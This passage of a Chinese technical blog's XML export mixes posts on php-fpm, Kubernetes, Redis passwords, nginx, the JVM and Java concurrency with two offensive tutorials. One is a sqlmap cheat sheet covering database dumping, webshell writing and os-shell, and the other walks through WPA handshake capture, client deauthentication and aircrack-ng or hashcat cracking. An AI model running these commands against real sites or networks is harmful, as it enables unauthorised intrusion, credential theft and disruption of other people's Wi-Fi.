timeout="600"&gt;&lt;ip&gt;113.106.207.158&lt;/ip&gt;&lt;ip&gt;14.215.85.14&lt;/ip&gt;&lt;ip&gt;119.147.83.41&lt;/ip&gt;&lt;ip&gt;113.106.207.159&lt;/ip&gt;&lt;ip&gt;113.96.156.170&lt;/ip&gt;&lt;ip&gt;113.96.156.174&lt;/ip&gt;&lt;ip&gt;14.215.85.41&lt;/ip&gt;&lt;ip&gt;113.106.207.160&lt;/ip&gt;&lt;ip&gt;113.96.156.172&lt;/ip&gt;&lt;ip&gt;119.147.83.44&lt;/ip&gt;&lt;ip&gt;14.215.85.12&lt;/ip&gt;&lt;ip&gt;14.215.85.13&lt;/ip&gt;&lt;ip&gt;183.60.171.157&lt;/ip&gt;&lt;ip&gt;183.2.196.145&lt;/ip&gt;&lt;ip&gt;113.106.207.157&lt;/ip&gt;&lt;ip&gt;113.96.156.171&lt;/ip&gt;&lt;ip&gt;119.147.83.42&lt;/ip&gt;&lt;ip&gt;119.147.83.43&lt;/ip&gt;&lt;ip&gt;183.2.196.144&lt;/ip&gt;&lt;ip&gt;183.2.196.143&lt;/ip&gt;&lt;ip&gt;113.96.156.173&lt;/ip&gt;&lt;ip&gt;219.135.57.150&lt;/ip&gt;&lt;/domain&gt;&lt;/domainlist&gt;&lt;builtiniplist&gt;&lt;ip&gt;123.151.10.172&lt;/ip&gt;&lt;ip&gt;101.226.211.106&lt;/ip&gt;&lt;/builtiniplist&gt;&lt;clientip&gt;119.129.226.76&lt;/clientip&gt;&lt;clientispid&gt;0&lt;/clientispid&gt;&lt;timestamp&gt;1536422400&lt;/timestamp&gt;&lt;signature2&gt;MEUCID6hqr/0wSH9+B9RI0Xky8xVEpGOgKNMVIQyiqRIHh51AiEAs4afTeevOAXP/n+wJ0xDiXt1HLVVflZGDlJSQzvrfuc=&lt;/signature2&gt;&lt;/dns&gt;&lt;functionlist&gt;&lt;change&gt;false&lt;/change&gt;&lt;/functionlist&gt; 紧接着就请求这个ip,这个ip不在上述的ip列表中。113.96.209.106 而且发了两个数据是加密的请求]]></content>
  </entry>
  <entry>
    <title><![CDATA[php-fpm]]></title>
    <url>%2F2018%2F08%2F30%2Fphp-fpm%2F</url>
    <content type="text"><![CDATA[php问题集问题：每次容器重启后，php.ini 中的display_errors 恢复Offphp.ini 中的display_errors在nginx+php-fpm 组成的docker容器重启时，display_errors恢复为Off ，对开发极为不便，可以在docker容器中/etc/supervisord.conf 中添加php-fpm 的启动参数-d display_errors=On 如： 123456789[program:php5-fpm]command=/usr/sbin/php-fpm5.6 -c /etc/php/5.6/fpm -d display_errors=Onautostart=trueautorestart=truepriority=5stdout_logfile=/dev/stdoutstdout_logfile_maxbytes=0stderr_logfile=/dev/stderrstderr_logfile_maxbytes=0 问题：php 的tmpfile()函数无法操作容器中/tmpnginx+php-fpm ，如果无法操作/tmp路径，会报一下错误 123456Warning: Unknown: open_basedir restriction in effect. File(/tmp) is not within the allowed path(s): (/var/www) in Unknown on line 0Warning: File upload error - unable to create a temporary file in Unknown on line 0Warning: unlink(.jpg): No such file or directory in /var/www/App/Admin/Controller/UploadFiles.php on line 61&#123;&quot;status&quot;:false,&quot;msg&quot;:&quot;\u4e34\u65f6\u6587\u4ef6\u65e0\u6cd5\u8bfb\u53d6&quot;&#125; 解决方法：在nginx的配置文件中加上如下配置： 1fastcgi_param PHP_VALUE &quot;open_basedir=$document_root:/tmp&quot;; 这样子，php就可以操作网站根目录($document_root)和/tmp目录了]]></content>
      <tags>
        <tag>php</tag>
        <tag>php-fpm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kubernetes初探]]></title>
    <url>%2F2018%2F08%2F03%2Fk8s-1%2F</url>
    <content type="text"><![CDATA[Kubernetes 初探使用minikube搭建本地简易k8s集群minikube相关命令 12345678#启动minikube start#使用dashboardminikube dashboard#查看minikube 版本minikube version#查看minikube 在线最新的版本minikube get-k8s-versions kubectl相关命令,是与Api-Server交互的工具 123456#查看集群kubectl cluster-info#查看版本kubectl version#查看api的版本kubectl api-versions kubectl 常用命令 1234567891011121314151617181920212223242526272829#查看节点 可以简写node 为 nokubectl get node#创建一个命名为nginx的deployment ,使用1.7.9的nginx 镜像kubectl run nginx --image=nginx:1.7.9#查看所有deploymentkubectl get deploy#查看 指定 的deploymentkubectl get deploy nginx#详细查看deploymentkubectl describe deploy nginx#查看所有ReplicasSetkubectl get rs#详细查看某一个ReplicasSetkubectl describe rs nginx-6bf8748584#查看所有的podkubectl get po#查看某个pokubectl get po#查看多了IP和Node信息kubectl get po nginx-6bf8748584-6nqwf -o wide#查看pod 的运行日志,由于nginx 的日志没有向标准输出 输出日志，所有看不到kubectl logs nginx-6bf8748584-6nqwf#进入容器,exit退出kubectl exec -it nginx-6bf8748584-6nqwf /bin/bash 之前都是创建一个deployment,里面有ReplicasSet,以及生成了对应的Pod.现在我们准备创建一个Servcie,来使用上面的Pod：准备一个文件nginx.svc.yaml 1234567891011121314151617181920apiVersion: v1kind: Service# 类型为Servicemetadata: name: nginx labels: app: nginxspec: ports: - name: http port: 8888 nodePort: 30001  #外部访问端口 targetPort: 80 #内部端口 selector: run: nginx #使用label为run=nginx的pod type: NodePort #对外可访问类型 1234#使用一下命令创建Sevicekubectl create -f nginx.svc.yaml#查看所有的Servicekubectl get svc 其他方法创建： 123456789#创建一个deploy名字为nginx ，并且暴露出来kubectl expose deploy nginx --type=NodePort --name=nginx-ext --port=80#查看kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 6dnginx NodePort 10.108.18.177 &lt;none&gt; 8888:30001/TCP 2hnginx-ext NodePort 10.110.240.109 &lt;none&gt; 80:30048/TCP 3s 删除服务 1kubectl delete svc nginx-ext 查看Endpoint 12345kubectl get epNAME ENDPOINTS AGEkubernetes 192.168.99.100:8443 7dnginx 172.17.0.7:80 3hnginx-ext 172.17.0.7:80 1m 我们可以看到上面两个service都使用了相同的endpoints 我们来复制多个Pod 123456789101112131415161718192021222324252627282930#扩容为3份kubectl scale deploy nginx --replicas=3#再次查看deploymentkubectl get deploy nginx#再次查看rskubectl get rs#再次查看pokubectl get po#再次查看epkubectl get ep#扩容为2份kubectl scale deploy nginx --replicas=2#升级deploy 里的nginx 版本kubectl set image deploy nginx nginx=nginx:1.9.1#查看rollout 信息kubectl rollout status deploy nginxdeployment "nginx" successfully rolled out#查看rollout 历史信息kubectl rollout history deploy nginxdeployments "nginx"REVISION CHANGE-CAUSE1 &lt;none&gt;2 &lt;none&gt;#详细查看 deploymentkubectl describe deploy nginx 当我们升级一个错误版本，或不稳定的版本 123456789101112131415161718192021222324252627#升级一个不存在的版本kubectl set image deploy nginx nginx=nginx:1.95#查看滚动升级信息kubectl rollout status deploy nginxWaiting for rollout to finish: 1 old replicas are pending termination#上面一直都是没响应#查看rollout 历史信息kubectl rollout history deploy nginxdeployments "nginx"REVISION CHANGE-CAUSE1 &lt;none&gt;2 &lt;none&gt;3 &lt;none&gt;#上面还是多了一个日志kubectl get poNAME READY STATUS RESTARTS AGEnginx-548ddd8784-7qkvz 0/1 ErrImagePull 0 3mnginx-6bf8748584-6nqwf 1/1 Running 0 3hnginx-6bf8748584-ktpdm 1/1 Running 0 33mnginx-6bf8748584-l68r8 1/1 Running 0 33m#我们发现 nginx-548ddd8784-7qkvz 错误了ErrImagePull #我们详细看看这个po ，查看事件Eventkubectl describe po nginx-548ddd8784-7qkvz#可以知道是获取不了这个镜像 ， Failed to pull image "nginx:1.95" 我们发现，就算滚动升级失败了，就的版本依然在运行，需要回滚一下 1kubectl rollout undo deploy nginx 推荐一下教程：IBM视频教程：https://www.kubernetes.org.cn/3546.htmlk8s中文文档：http://docs.kubernetes.org.cn/117.html3小时攻克Kubernetes:http://baijiahao.baidu.com/s?id=1602795888204860650&amp;wfr=spider&amp;for=pc3小时攻克Kubernetes原代码：https://github.com/rinormaloku/k8s-mastery]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis-passwd]]></title>
    <url>%2F2018%2F04%2F21%2Fredis-passwd%2F</url>
    <content type="text"><![CDATA[redis 修改登录密码redis没有实现访问控制这个功能，但是它提供了一个轻量级的认证方式，可以编辑redis.conf配置来启用认证。 1、初始化Redis密码： 在配置文件中有个参数： requirepass 这个就是配置redis访问密码的参数； 比如 requirepass test123； （Ps:需重启Redis才能生效） redis的查询速度是非常快的，外部用户一秒内可以尝试多大150K个密码；所以密码要尽量长（对于DBA 没有必要必须记住密码）； 2、不重启Redis设置密码： 在配置文件中配置requirepass的密码（当redis重启时密码依然有效）。 redis 127.0.0.1:6379&gt; config set requirepass test123 查询密码： redis 127.0.0.1:6379&gt; config get requirepass (error) ERR operation not permitted 密码验证： redis 127.0.0.1:6379&gt; auth test123 OK 再次查询： redis 127.0.0.1:6379&gt; config get requirepass 1) “requirepass” 2) “test123” PS：如果配置文件中没添加密码 那么redis重启后，密码失效； 3、登陆有密码的Redis： 在登录的时候的时候输入密码： redis-cli -p 6379 -a test123 先登陆后验证： redis-cli -p 6379 redis 127.0.0.1:6379&gt; auth test123 OK AUTH命令跟其他redis命令一样，是没有加密的；阻止不了攻击者在网络上窃取你的密码； 认证层的目标是提供多一层的保护。如果防火墙或者用来保护redis的系统防御外部攻击失败的话，外部用户如果没有通过密码认证还是无法访问redis的]]></content>
      <categories>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 索引]]></title>
    <url>%2F2018%2F03%2F14%2Fmysql-index%2F</url>
    <content type="text"></content>
      <categories>
        <category>Kali</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap精华笔记]]></title>
    <url>%2F2018%2F03%2F11%2Fsqlmap-note%2F</url>
    <content type="text"><![CDATA[sqlmap笔记简介sqlmap支持五种不同的注入模式：1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4、联合查询注入，可以使用union的情况下的注入。5、堆查询注入，可以同时执行多条语句的执行时的注入。 支持的数据库有：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 注入基本格式sqlmap -u “http://www.vuln.cn/post.php?id=1“默认使用level1检测全部数据库类型sqlmap -u “http://www.vuln.cn/post.php?id=1“ –dbms mysql –level 3指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面） 跟随302跳转 当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，当注入错误的时候，先报错再跳转的时候，不需要跟随302。目的就是：要追踪到错误信息。 cookie注入当程序有防get注入的时候，可以使用cookie注入sqlmap -u “http://www.baidu.com/shownews.asp“ –cookie “id=11” –level 2（只有level达到2才会检测cookie） 从post数据包中注入可以使用burpsuite或者temperdata等工具来抓取post包sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql 指定username参数 注入成功后获取数据库基本信息sqlmap -u “http://www.vuln.cn/post.php?id=1“ –dbms mysql –level 3 –dbs查询有哪些数据库sqlmap -u “http://www.vuln.cn/post.php?id=1“ –dbms mysql –level 3 -D test –tables查询test数据库中有哪些表sqlmap -u “http://www.vuln.cn/post.php?id=1“ –dbms mysql –level 3 -D test -T admin –columns查询test数据库中admin表有哪些字段sqlmap -u “http://www.vuln.cn/post.php?id=1“ –dbms mysql –level 3 -D test -T admin -C “username,password” –dumpdump出字段username与password中的数据其他命令参考下面 从数据库中搜索字段sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password在dedecms数据库中搜索字段admin或者password。 读取与写入文件首先找需要网站的物理路径，其次需要有可写或可读权限。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径示例：sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”使用shell命令：sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell接下来指定网站可写目录：“E:\php\htdocs\dvwa”注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令：–is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项）：–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）保存进度继续跑：sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度 Target（目标）：以下至少需要设置其中一个选项，设置目标URL。-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）：这些选项可以用来指定如何连接到目标URL。–data=DATA 通过POST发送的数据字符串–cookie=COOKIE HTTP Cookie头–cookie-urlencode URL 编码生成的cookie注入–drop-set-cookie 忽略响应的Set - Cookie头信息–user-agent=AGENT 指定 HTTP User - Agent头–random-agent 使用随机选定的HTTP User - Agent头–referer=REFERER 指定 HTTP Referer头–headers=HEADERS 换行分开，加入其他的HTTP头–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）–auth-cert=ACERT HTTP认证证书（key_file，cert_file）–proxy=PROXY 使用HTTP代理连接到目标URL–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）–ignore-proxy 忽略系统默认的HTTP代理–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）–retries=RETRIES 连接超时后重新连接的时间（默认3）–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式–safe-url=SAFURL 在测试过程中经常访问的url地址–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。-b, –banner 检索数据库管理系统的标识–current-user 检索数据库管理系统当前用户–current-db 检索数据库管理系统当前数据库–is-dba 检测DBMS当前用户是否DBA–users 枚举数据库管理系统用户–passwords 枚举数据库管理系统用户密码哈希–privileges 枚举数据库管理系统用户的权限–roles 枚举数据库管理系统用户的角色–dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）–tables 枚举的DBMS数据库中的表–columns 枚举DBMS数据库表列–dump 转储数据库管理系统的数据库中的表项–dump-all 转储所有的DBMS数据库表中的条目–search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户–exclude-sysdbs 枚举表时排除系统数据库–start=LIMITSTART 第一个查询输出进入检索–stop=LIMITSTOP 最后查询的输出进入检索–first=FIRSTCHAR 第一个查询输出字的字符检索–last=LASTCHAR 最后查询的输出字字符检索–sql-query=QUERY 要执行的SQL语句–sql-shell 提示交互式SQL的shell Optimization（优化）：这些选项可用于优化SqlMap的性能。-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页 Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹 Brute force（蛮力）：这些选项可以被用来运行蛮力检查。–common-tables 检查存在共同表–common-columns 检查存在共同列User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。–udf-inject 注入用户自定义函数–shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面]]></content>
      <categories>
        <category>Kali</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线WIFI破解]]></title>
    <url>%2F2018%2F03%2F11%2Faircrack-ng%2F</url>
    <content type="text"><![CDATA[无线WIFI破解检测网卡1iwconfig 查看周围网络1airodump-ng wlan0 开始抓握手包1airodump -w [写出名字] -c [通道数字] --bssid [bssid码] wlan0 由于握手包是有人连接路由时才产生的，所以一直等待也不是办法，于是就要尝试断开已有的用户，让他们重新连接路由，由此在网络中产生握手包 强制中断用户1aireplay-ng -0 0 -a [bssid码] wlan0 一旦在嗅探页面出现 WPA handshake 字样，就抓到了该无线网的握手包 使用字典爆破握手包1aircrack-ng [拿到的cap文件] -w [字典路径] 或使用hashcat 先把cap文件转为hccapx文件1./cap2hccapx.bin ~/Desktop/hccap_files/01.cap ~/Desktop/hccap_files/fdf6.hccap 再使用hashcat 破解1hashcat -m 2500 -a 0 -o ./outfile.txt --outfile-format=2 xxxhccap words.txt]]></content>
      <categories>
        <category>Kali</category>
        <category>aircrack-ng</category>
      </categories>
      <tags>
        <tag>aircrack-ng</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx-Thinkphp配置]]></title>
    <url>%2F2018%2F03%2F11%2Fnginx-php%2F</url>
    <content type="text"><![CDATA[Nginx + Thinkphp 配置新版本的nginx有一个自带的函数可以处理pathinfo，如下：123456789location ~ .php(.*)$ &#123; fastcgi_pass unix:/tmp/php-cgi.sock; fastcgi_index index.php; fastcgi_split_path_info ^(.+.php)(.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; include fastcgi_params;&#125;]]></content>
      <categories>
        <category>nginx</category>
        <category>nginx-php5.6</category>
      </categories>
      <tags>
        <tag>nginx-php5.6配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JVM虚拟机]]></title>
    <url>%2F2018%2F03%2F08%2Fjvm-1%2F</url>
    <content type="text"><![CDATA[目录 java虚拟机概述和基本概念 堆，栈，方法区 了解虚拟机参数 垃圾回收概念和算法，及对象的分代转换 垃圾收集器 Tomcat性能影响实验 性能监控工具 1.1 java 虚拟机的原理所谓虚拟机，就是一台虚拟的机器，它是一款软件，用来执行一系列虚拟计算机指令。大体上虚拟机分为系统虚拟机和程序虚拟机，Visual Box ，VMware就属于系统虚拟机。完全是对无力计算机的仿真，提供一个可运行完整操作系统的软件品台。程序虚拟机典型代表就是java虚拟机，它专门为执行单个计算机程序而设计，在java虚拟机中执行的指令。 1.2 认识java 虚拟机的基本结构 九大部分： 1.类加载子系统 负责从文件系统或网络中加载Class信息，加载的信息放在方法区里。 2.方法区 存放类信息，常量信息，常量池信息，包括字符串字面量和数字常量等。 3.java堆 在java虚拟机启动的时候建立java堆，它是java程序最主要的内存工作区域，几乎所有的对象实例都放在java堆中，堆空间是所有线程共享的。 4.直接内存 java的NIO库允许java程序使用直接内存，从而提高性能，通常直接内存速度会优于java堆，读写频繁的场合可能会考虑使用 5.java栈 每个虚拟机线程都有一个私有的栈，一个线程的java栈在线程创建的时候被创建，java栈中保存局部变量，方法参数，同时java的方法调用，返回值等。 6.本地方法栈 本地方法栈和java栈非常累屎，最大不同为本地方法栈用于本地方法调用。java虚拟机允许java直接调用本地方法（通常使用c编写） 7.垃圾回收系统 垃圾回收系统是java的核心，也是必不可少的，java有一套自己进行垃圾清理的机制，开发人员无需手工清理。 8.PC寄存器 Program Counter 寄存器也是每个线程私有的空间，java虚拟机会为每个线程创建pc寄存器，在任意时刻，一个java线程总是执行一个方法，这个方法被称为当前方法，如果当前方法不是本地方法，pc寄存器就会执行当前正在被执行的指令；如果是本地方法，则pc寄存器值为undefined，寄存器存放如当前执行环境指针，程序计数器，操作栈指针，计算的变量等信息。 9.执行引擎 虚拟机最核心的组件就是执行引擎了，它负责执行虚拟机的字节码，一般先进行编译成机器码后执行 2.2 java 堆java 堆分代：年轻代与年老代，年轻代有3个区，eden,from,to 年老代只有一个区tenured 在GC开始的时候，对象只会存在于Eden区和名为“From”的Survivor区，Survivor区“To”是空的。紧接着进行GC，Eden区中所有存活的对象都会被复制到“To”，而在“From”区中，仍存活的对象会根据他们的年龄值来决定去向。年龄达到一定值(年龄阈值，可以通过-XX:MaxTenuringThreshold来设置)的对象会被移动到年老代中，没有达到阈值的对象会被复制到“To”区域。经过这次GC后，Eden区和From区已经被清空。这个时候，“From”和“To”会交换他们的角色，也就是新的“To”就是上次GC前的“From”，新的“From”就是上次GC前的“To”。不管怎样，都会保证名为To的Survivor区域是空的。Minor GC会一直重复这样的过程，直到“To”区被填满，“To”区被填满之后，会将所有对象移动到年老代中。 2.3 java 栈 2.4 java 方法区 3.2 jvm参数配置堆配置 栈配置]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java并发编程第一篇]]></title>
    <url>%2F2018%2F02%2F26%2Fjava-concurrent-1%2F</url>
    <content type="text"><![CDATA[目录1.1并发编程的目的1.2线程安全1.3对象锁的同步和异步1.4脏读1.5synchronized的其他概念1.6synchronized代码块1.7volatile关键字 1.1 并发编程的目的第一：面试非常重要第二：知识拓展第三：在以后的分布式系统中，你都可以找到类似的并发，分布式，并行处理的问题 多线程中：synchronized 同步的volatile 爆炸性，挥发性ReentrantLock 重进入锁concurrent 并发的；一致的；同时发生的 1.2 线程安全1.2.1 概念当多个线程访问某一个类（对象或方法）时，这个类始终都能表现出正确的行为，那么这个类（对象或方法）就是线程安全的。 synchronized:可以在任意对象及方法上加锁，而加锁的这段代码称为“互斥区”或“临界区” 1.2.2 多线程与多个锁关键字synchronized 是对象锁，多个对象相当于有多个锁。所以说当多个线程操作的是不同的对象时，就相当于使用多把锁，多线程之间互不影响。 注意，当synchronized修饰的是静态方法时，这把锁是类锁，无论有多少个对象，它们公用一把锁，因此会产生锁竞争 1.3 对象锁的同步和异步同步：synchronized 同步概念就是共享，共享资源。 异步：asynchronized 异步的概念就是独立，相互之间不受任何制约。 同步需要线程安全。需要两个特性： 1.原子性（同步） 2.可见性 1.3.1 对象锁的必要性案例11234567891011121314151617181920212223242526272829303132333435363738394041424344package mytest;public class Bank &#123; private double money=1000; //取钱 public double getMoney(double get_money)&#123; money=money-get_money; System.out.println("取钱后，总金额："+money); return get_money ; &#125; //存钱 public double putMoney(double put_money)&#123; money+=put_money; System.out.println("存钱后，总金额："+money); return money; &#125; public static void main(String [] args)&#123; Bank bank= new Bank(); Thread t1=new Thread(new Runnable()&#123; @Override public void run() &#123; bank.getMoney(100); &#125; &#125;,"t1"); Thread t2=new Thread(new Runnable()&#123; @Override public void run() &#123; bank.putMoney(100); &#125; &#125;,"t2"); t1.start(); t2.start(); &#125;&#125; 结果：取钱后，总金额：1000.0存钱后，总金额：1000.0 我们期待的结果应该是“取钱后，总金额：900.0存钱后，总金额：1000.0”，那是因为线程1和线程2的代码经过排列之后才给cpu处理，有可能排列的是这样的： 12345//有可能排序成这样，依次让cpu处理:money=money-get_money;//线程1的代码money+=put_money;//线程2的代码System.out.println("取钱后，总金额："+money);//线程1的代码System.out.println("存钱后，总金额："+money);//线程2的代码 所以有可能出现以上结果 改进代码加上synchronized,使得getMoney和putMoney的方法拥有原子性，就是说，里面的代码是一个整体，在cpu排序处理时，不可插入其他线程的代码。1234567891011121314151617181920212223242526272829303132333435363738394041424344package mytest;public class Bank &#123; private double money=1000; //取钱 public synchronized double getMoney(double get_money)&#123; money=money-get_money; System.out.println("取钱后，总金额："+money); return get_money ; &#125; //存钱 public synchronized double putMoney(double put_money)&#123; money+=put_money; System.out.println("存钱后，总金额："+money); return money; &#125; public static void main(String [] args)&#123; Bank bank= new Bank(); Thread t1=new Thread(new Runnable()&#123; @Override public void run() &#123; bank.getMoney(100); &#125; &#125;,"t1"); Thread t2=new Thread(new Runnable()&#123; @Override public void run() &#123; bank.putMoney(100); &#125; &#125;,"t2"); t1.start(); t2.start(); &#125;&#125; 结果：取钱后，总金额：900.0存钱后，总金额：1000.0 对象锁被synchronzied修饰的方法叫同步方法，否则叫异步方法。当某一线程调用该对象的同步方法时，其他线程无法调用该对象的其他同步方法，但是可以调用该对象的异步方法。也就是说，无论多少个synchronized方法，一个对象一把锁，使用了一把锁，其他的线程只能等待锁释放，才能访问同步方法。 案例212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package mytest;public class Bank &#123; private volatile double money=1000; //同步方法，取钱 public synchronized double getMoney(double get_money)&#123; money=money-get_money; System.out.println("取钱后，总金额："+money);// return get_money ; while(true)&#123; System.out.println(Thread.currentThread().getName()+"拿着把锁"); &#125; &#125; //异步方法，存钱 public synchronized double putMoney(double put_money)&#123; money+=put_money; System.out.println("存钱后，总金额："+money); return money; &#125; //异步方法 public void getm()&#123; while(true)&#123; System.out.println("异步方法，============总金额："+money); &#125; &#125; public static void main(String [] args)&#123; Bank bank= new Bank(); Thread t1=new Thread(new Runnable()&#123; @Override public void run() &#123; //访问同步方法 bank.getMoney(100); &#125; &#125;,"t1"); Thread t2=new Thread(new Runnable()&#123; @Override public void run() &#123; //访问同步方法 bank.putMoney(100); &#125; &#125;,"t2"); Thread t3=new Thread(new Runnable()&#123; @Override public void run() &#123; //访问异步方法 bank.getm(); &#125; &#125;,"t3"); t1.start(); t2.start(); t3.start(); &#125; &#125; 结果：t1拿着把锁异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0t1拿着把锁t1拿着把锁异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0异步方法，============总金额：900.0t1拿着把锁t1拿着把锁异步方法，============总金额：900.0 总结：当线程持续拿着一把对象锁(bank)不放时，其他线程就不能访问该对象锁(bank)，但是能访问bank的异步方法。 1.4 脏读对于对象的同步和异步的方法，我们在设计自己的程序时候，一定要考虑问题的整体(原子性)，不然会出现数据不一致的错误。 例子：set/get方法都加上synchronized的修饰。 synchronized能保证函数的原子性 1.5 synchronized的其他概念锁重入概念关键字synchronized 